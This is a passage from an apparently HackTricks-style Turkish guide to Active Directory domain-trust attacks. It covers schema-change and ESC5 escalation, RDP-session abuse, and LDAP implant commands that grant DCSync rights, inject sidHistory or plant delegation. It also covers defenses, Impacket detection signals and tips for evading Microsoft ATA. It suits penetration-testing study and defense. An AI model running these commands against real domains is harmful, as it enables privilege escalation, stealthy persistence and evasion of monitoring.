golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA saldırısı (BadSuccessor – migration attributes'ı kötüye kullanma):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek harici araştırma: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change saldırısı**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD nesnelerinin oluşturulmasını beklemek gerekir. SYSTEM privileges sahibi bir saldırgan, herhangi bir kullanıcıya tüm class'lar üzerinde tam denetim vermek için AD Schema'yı değiştirebilir. Bu, yeni oluşturulan AD nesnelerine yetkisiz erişim ve denetim elde edilmesine yol açabilir.

Daha fazla bilgi için [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) sayfasına bakılabilir.<sup>[[14]](#references)</sup>

**ADCS ESC5 ile DA'dan EA'ya**

ADCS ESC5 güvenlik açığı, forest içindeki herhangi bir kullanıcı olarak authentication sağlamayı mümkün kılan bir certificate template oluşturmak için Public Key Infrastructure (PKI) nesneleri üzerindeki denetimi hedefler. PKI nesneleri Configuration NC içinde bulunduğundan, writeable bir child DC'nin ele geçirilmesi ESC5 saldırılarının gerçekleştirilmesini sağlar.

Bununla ilgili daha fazla bilgi [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) sayfasında bulunabilir.<sup>[[15]](#references)</sup> ADCS bulunmayan senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) başlıklı yazıda ele alındığı gibi gerekli bileşenleri kurabilir.<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Bu senaryoda **etki alanınız, size üzerinde belirsiz izinler veren harici bir etki alanı tarafından güvenilir**. Etki alanınızdaki **hangi principal'ların harici etki alanında hangi erişimlere sahip olduğunu** bulmanız ve ardından bunu istismar etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Orman Etki Alanı - Tek Yönlü (Giden)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Bu senaryoda **etki alanınız**, **farklı etki alanlarındaki** sorumlulara bazı **ayrıcalıklar** veren **güvenen** etki alanıdır.

Ancak **güvenilen bir etki alanı**, güvenen etki alanı tarafından **güvenildiğinde**, güvenilen etki alanı **tahmin edilebilir bir adla** bir kullanıcı **oluşturur** ve bu kullanıcı **parola olarak güvenilen parolayı** kullanır. Bu da **güvenen etki alanındaki bir kullanıcıya erişip** güvenilen etki alanına girmeyi, etki alanını numaralandırmayı ve daha fazla ayrıcalığı yükseltmeye çalışmayı mümkün kılar:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Güvenilen etki alanını ele geçirmenin bir başka yolu, etki alanı trust'ının **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu pek yaygın değildir).

Güvenilen etki alanını ele geçirmenin başka bir yolu da, **güvenilen etki alanındaki bir kullanıcının erişebildiği** bir makinede bekleyip kullanıcının **RDP** ile oturum açmasını sağlamaktır. Ardından saldırgan, RDP oturum sürecine kod enjekte ederek **kurbanın kaynak etki alanına** buradan **erişebilir**.\
Ayrıca, **kurban sabit diskini bağladıysa**, saldırgan **RDP oturum** sürecinden sabit diskin **başlangıç klasörüne** **backdoor** kaydedebilir. Bu teknik **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Etki alanı trust abuse azaltma

### **SID Filtering:**

- Orman trust'ları üzerinden SID history özniteliğinden yararlanan saldırıların riski, tüm ormanlar arası trust'larda varsayılan olarak etkin olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un tutumuna göre güvenlik sınırı olarak etki alanını değil ormanı kabul ederek, orman içi trust'ların güvenli olduğu varsayımına dayanır.
- Ancak bir pürüz vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu nedenle bazen devre dışı bırakılır.

### **Selective Authentication:**

- Ormanlar arası trust'larda Selective Authentication kullanılması, iki ormandaki kullanıcıların otomatik olarak kimlik doğrulamasından geçmemesini sağlar. Bunun yerine, kullanıcıların güvenen etki alanı veya ormanındaki etki alanlarına ve sunuculara erişebilmesi için açık izinler gerekir.
- Bu önlemlerin, yazılabilir Configuration Naming Context (NC) istismarına veya trust hesabına yönelik saldırılara karşı koruma sağlamadığını unutmayın.

[**ired.team'de etki alanı trust'ları hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant'lardan LDAP tabanlı AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD tarzı LDAP ilkellerini, tamamen on-host implant içinde (ör. Adaptix C2) çalışan x64 Beacon Object Files olarak yeniden uygular. Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` komutuyla derler, `ldap.axs` dosyasını yükler ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm trafik, mevcut oturum açma güvenlik bağlamını kullanarak imzalama/mühürleme ile LDAP (389) veya otomatik sertifika güveniyle LDAPS (636) üzerinden iletilir; bu nedenle socks proxy'leri ya da diskte artefaktlar gerekmez.<sup>[[4]](#references)</sup>

### Implant tarafında LDAP numaralandırması

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa adları/OU yollarını tam DN'lere dönüştürür ve ilgili nesneleri döker.
- `get-object`, `get-attribute` ve `get-domaininfo`, rastgele öznitelikleri (güvenlik tanımlayıcıları dahil) ve `rootDSE` üzerinden orman/etki alanı meta verilerini çeker.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, LDAP'tan doğrudan roast edilebilecek adayları, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) tanımlayıcılarını sunar.
- `get-acl` ve `get-writable --detailed`, trustee'leri, hakları (GenericAll/WriteDACL/WriteOwner/öznitelik yazma izinleri) ve kalıtımı listelemek için DACL'yi ayrıştırır; böylece ACL privilege escalation için hedefleri hemen belirler.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün, OU üzerinde haklarının bulunduğu her yerde yeni principal’lar veya makine hesapları oluşturmasını sağlar. `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, write-property hakları bulunduğunda hedefleri doğrudan ele geçirmeyi sağlar.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD nesnesindeki WriteDACL/WriteOwner haklarını PowerShell/ADSI izleri bırakmadan parola sıfırlama, grup üyeliğini kontrol etme veya DCSync çoğaltma ayrıcalıklarına dönüştürür. `remove-*` karşılıkları eklenen ACE’leri temizler.

### Delegation, roasting ve Kerberos abuse

- `add-spn`/`set-spn`, ele geçirilmiş bir kullanıcıyı anında Kerberoastable hâle getirir; `add-asreproastable` (UAC toggle), parolaya dokunmadan kullanıcıyı AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC flags veya `msDS-AllowedToActOnBehalfOfOtherIdentity` değerlerini yeniden yazar; böylece constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzak PowerShell ya da RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation ve attack surface shaping

- `add-sidhistory`, denetlenen bir principal’ın SID history’sine ayrıcalıklı SID’ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın) ve LDAP/LDAPS üzerinden gizlice erişim devralmayı sağlar.
- `move-object`, bilgisayarların veya kullanıcıların DN/OU konumunu değiştirir; böylece saldırgan, `set-password`, `add-groupmember` veya `add-spn` kullanmadan önce varlıkları devredilmiş hakların kapsamına alabilir. Taşıma izinleri ve kalıtım kontrolleri için [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) bölümüne bakın.
- Kapsamı sıkı şekilde belirlenmiş kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör kimlik bilgilerini veya persistence’ı elde ettikten sonra hızlı geri alma işlemi yaparak telemetriyi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Kimlik bilgilerini nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Kimlik Bilgilerini Korumaya Yönelik Savunma Önlemleri**

- **Domain Admins Kısıtlamaları**: Domain Admins hesaplarının yalnızca Domain Controller’larda oturum açmasına izin verilmesi ve başka host’larda kullanılmaması önerilir.
- **Service Account Ayrıcalıkları**: Güvenliği korumak için servisler Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Ayrıcalıkların Süreyle Sınırlandırılması**: DA ayrıcalıkları gerektiren görevlerin süresi sınırlandırılmalıdır. Bu, şu şekilde yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay riskini azaltma**: Önce Event ID 2889/3074/3075’i denetleyin, ardından LDAP MITM/relay girişimlerini engellemek için DC’lerde/istemcilerde LDAP signing ve LDAPS channel binding’i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket etkinliğinin protokol düzeyinde parmak izini çıkarma

Yaygın AD tradecraft’ını tespit etmek istiyorsanız, yalnızca operatörün kontrol edebildiği yeniden adlandırılmış binary’ler, service adları, geçici batch dosyaları veya çıktı yolları gibi izlere **güvenmeyin**. Meşru Windows istemcilerinin [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI trafiğini nasıl oluşturduğunu temel çizgi olarak belirleyin; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını değiştirse bile devam eden **uygulama farklılıklarını** arayın.<sup>[[8]](#references)</sup>

- **Yüksek güvenliğe sahip bağımsız adaylar** (kendi temel çizginize göre doğruladıktan sonra):
  - `auth_context_id = 79231 + ctx_id` kullanan kimliği doğrulanmış DCE/RPC
  - `0xff` ile doldurulmuş DCE/RPC authentication padding
  - Ham Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos bind’leri
  - ASCII benzeri `ClientGuid` değerlerine sahip SMB2/3 negotiate istekleri
  - Standart dışı `//./root/cimv2` namespace’ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
  - Sabit kodlanmış Kerberos nonce değerleri
- **Korelasyon/skorlama özellikleri olarak kullanılması daha uygun olanlar**:
  - Seyrek veya yinelenen Kerberos etype listeleri, olağandışı/eksik `PA-DATA` ya da native Windows’tan farklı TGS-REQ etype sıralaması
  - Version info içermeyen NTLM Type 1 mesajları veya null host name içeren Type 3 mesajları
  - SPNEGO yerine DCE/RPC içinde taşınan ham NTLMSSP, eksik DCE/RPC verification trailer’ları veya SPNEGO/Kerberos OID uyuşmazlıkları
  - Aynı host/user/session/time window için bu özelliklerden birkaçı, tek bir zayıf alandan çok daha güçlü sinyal verir
- **Bağımsız uyarı olarak değil, zenginleştirme amacıyla kullanın**:
  - Varsayılan dosya adları, çıktı yolları, rastgele service adları, geçici batch adları, varsayılan bilgisayar hesabı adları ve araca özgü HTTP/WebDAV/RDP/MSSQL dizeleri
  - Operatörler bunları kolayca değiştirebilir; bu izler en iyi şekilde, protokoller arası bir kümenin neden şüpheli olduğunu açıklamak için kullanılır
- **Operasyonel notlar**:
  - Bu sinyallerin bazıları için şifresi çözülmüş trafik, [PCAP/Zeek ayrıştırması](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya servis tarafında görünürlük gerekir
  - Uyarı oluşturmadan önce Samba/Linux istemcileri, cihazlar ve eski yazılımlarla doğrulayın
  - Temel çizgiye duyduğunuz güven arttıkça tespitleri zenginleştirme -> hunting -> uyarı aşamalarına taşıyın

### **Deception Tekniklerini Uygulama**

- Deception uygulamak; parolaları süresi dolmayacak şekilde ayarlanmış veya Trusted for Delegation olarak işaretlenmiş decoy kullanıcılar ya da bilgisayarlar gibi tuzaklar kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi içerir.<sup>[[2]](#references)</sup>
- Uygulamalı bir örnek olarak şu araç kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerini uygulama hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresinden ulaşabilirsiniz.

### **Deception'ı Tespit Etme**

- **Kullanıcı Nesneleri İçin**: Şüpheli göstergeler arasında alışılmadık ObjectSID, seyrek oturum açma, oluşturulma tarihleri ve düşük hatalı parola sayıları bulunur.
- **Genel Göstergeler**: Olası decoy nesnelerin özniteliklerini gerçek nesnelerinkilerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu deception’ları belirlemeye yardımcı olabilir.

### **Detection Sistemlerini Atlatma**

- **Microsoft ATA Detection Bypass**:
  - **Kullanıcı Numaralandırması**: ATA tarafından tespit edilmemek için Domain Controller’larda session enumeration yapmaktan kaçınma.
  - **Ticket Impersonation**: Ticket oluşturmak için **aes** key’leri kullanmak, NTLM’e düşüş yapmayarak tespitten kaçmaya yardımcı olur.
  - **DCSync Saldırıları**: ATA tarafından tespit edilmemek için işlemin Domain Controller olmayan bir makineden gerçekleştirilmesi önerilir; doğrudan Domain Controller’dan çalıştırılması uyarıları tetikler.

## References

- [1] [Domain Trust'larına Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust Oluşturma](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Koleksiyonu – Active Directory Exploitation için Bellek İçi LDAP Araç Takımı](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist Olarak Silahlandırma](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Korsanlar](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ı İnceleme](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon üzerinden Active Directory Hesaplarını Ele Geçirme](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon güvenli kanal bağlantılarındaki değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC arayüzlerine yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 4) - SID filtering'i atlatma araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 5) - Golden GMSA trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Etki alanları arasında güvenlik sınırı olarak SID filter? (Bölüm 6) - Schema change trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'den EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS'i kötüye kullanarak child domain yöneticilerinden enterprise admin'lere 5 dakikada yükselme: devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE Kolunuzun İçinde: Active Directory DACL Backdoor'larını Tasarlama](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k modül kaynak kodu](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
